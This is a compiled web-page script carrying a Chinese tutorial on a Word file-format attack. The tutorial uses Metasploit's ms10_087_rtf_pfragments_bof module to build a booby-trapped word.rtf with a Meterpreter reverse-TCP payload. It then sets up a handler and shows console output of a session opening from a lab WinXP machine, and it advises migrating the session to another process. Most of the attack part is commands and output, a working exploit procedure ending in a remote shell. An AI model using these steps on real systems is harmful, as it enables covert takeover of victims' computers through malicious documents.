import{i as e,r as t,s as n,t as r}from"./app-BmimykQ0.js";var i=JSON.parse(`{"path":"/md/hack/client/2022-05-02-005-%E5%9F%BA%E4%BA%8EWord%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB.html","title":"基于Word文件格式的渗透攻击","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"基于Word文件格式的渗透攻击","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"基于Word文件格式的渗透攻击","lock":"need"},"git":{"updatedTime":1777457818000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"1edeb523e6a5905ee9c691efa90ed644873d52a3","time":1777457818000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/client/2022-05-02-005-基于Word文件格式的渗透攻击.md"}`),a={name:`2022-05-02-005-基于Word文件格式的渗透攻击.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="基于word文件格式的渗透攻击" tabindex="-1"><a class="header-anchor" href="#基于word文件格式的渗透攻击"><span>基于Word文件格式的渗透攻击</span></a></h1><p>攻击机： Kali 192.168.175.128</p><p>靶机 WinXP 192.168.175.130</p><p>程序 Office 2003</p><h2 id="生成word文档" tabindex="-1"><a class="header-anchor" href="#生成word文档"><span>生成Word文档</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof </span>
<span class="line"><span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
<span class="line">show options</span>
<span class="line"><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
<span class="line"><span class="token builtin class-name">set</span> FILENAME word.rtf</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体如下：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msf5 <span class="token operator">&gt;</span> use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof </span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options</span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   FILENAME  msf.rtf          <span class="token function">yes</span>       The <span class="token function">file</span> name.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&#39;&#39;</span>, seh, thread, process, none<span class="token punctuation">)</span></span>
<span class="line">   LHOST                      <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT     <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line">   **DisablePayloadHandler: True   <span class="token punctuation">(</span>RHOST and RPORT settings will be ignored<span class="token operator">!</span><span class="token punctuation">)</span>**</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Automatic</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
<span class="line">LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.175.128</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> FILENAME word.rtf</span>
<span class="line">FILENAME <span class="token operator">=</span><span class="token operator">&gt;</span> word.rtf</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token string">&#39;word.rtf&#39;</span> <span class="token function">file</span> <span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> word.rtf stored at /root/.msf4/local/word.rtf</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>windows/fileformat/ms10_087_rtf_pfragments_bof<span class="token punctuation">)</span> <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到，在 /root/.msf4/local/目录下生成了word.rtf文件。</p><h2 id="上传文件到靶机" tabindex="-1"><a class="header-anchor" href="#上传文件到靶机"><span>上传文件到靶机</span></a></h2><p>在实际中，我们需要想办法将文件传到靶机上，这里，我就直接拷贝到靶机了</p><h2 id="实施攻击" tabindex="-1"><a class="header-anchor" href="#实施攻击"><span>实施攻击</span></a></h2><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">use exploit/multi/handler </span>
<span class="line"><span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
<span class="line">show options</span>
<span class="line"><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体如下：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler </span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options</span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&#39;&#39;</span>, seh, thread, process, none<span class="token punctuation">)</span></span>
<span class="line">   LHOST                      <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT     <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.175.128</span>
<span class="line">LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.175.128</span>
<span class="line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.175.128:4444 </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="打开word文件" tabindex="-1"><a class="header-anchor" href="#打开word文件"><span>打开Word文件</span></a></h2><p>在靶机上利用Office 2003打开PDF文件</p><h2 id="查看获得的meterpreter" tabindex="-1"><a class="header-anchor" href="#查看获得的meterpreter"><span>查看获得的Meterpreter</span></a></h2><p>在攻击机Kali上，我们看到MSF控制台中获得了Meterpreter权限。</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.175.128:4444 </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.175.130</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.175.128:4444 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.175.130:1431<span class="token punctuation">)</span> at <span class="token number">2019</span>-01-24 <span class="token number">16</span>:05:52 +0800</span>
<span class="line"></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>最后，最好用migrate命令将当前会话进程绑定到系统的其他进程中。</strong></p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,24)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};